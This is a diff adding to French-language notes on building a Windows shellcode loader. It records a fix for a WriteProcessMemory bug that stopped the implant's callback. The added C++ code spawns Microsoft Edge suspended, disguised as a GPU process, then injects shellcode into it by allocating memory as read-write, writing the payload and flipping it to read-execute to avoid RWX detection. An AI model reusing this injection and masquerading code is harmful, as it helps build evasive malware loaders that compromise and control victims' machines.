@@ -929,3 +929,50 @@ shellcode  // adresse des données, c'est ce qu'il faut
 ```
 
 `WriteProcessMemory` écrivait l'adresse du pointeur (8 bytes) dans la mémoire allouée au lieu du shellcode réel. Le thread s'exécutait sur des données invalides, aucun callback.
+
+
+# Edge
+
+```cpp
+CreateProcessW(
+	L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+	(LPWSTR)L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=gpu-process",
+	NULL,
+	NULL,
+	FALSE,
+	CREATE_SUSPENDED,
+	NULL,
+	L"C:\\Windows\\System32",
+	&si,
+	&pi
+);
+```
+
+# RWX
+
+Mettre RW, écrire dans la mémoire, puis passer en RX pour éxécuter
+```cpp
+// allocate a region of memory
+auto hMemory = VirtualAllocEx(
+	pi.hProcess,    // handle to newly spawned process
+	NULL,
+	shellcode_len,
+	MEM_COMMIT | MEM_RESERVE,
+	PAGE_READWRITE
+);
+
+// write the shellcode into memory
+SIZE_T bytesWritten = 0;
+WriteProcessMemory(
+	pi.hProcess,
+	hMemory,
+	shellcode,
+	shellcode_len,
+	&bytesWritten
+);
+
+// flip to RX — never writable and executable at the same time
+DWORD oldProtect;
+VirtualProtectEx(pi.hProcess, hMemory, shellcode_len, PAGE_EXECUTE_READ, &oldProtect);
+
+```
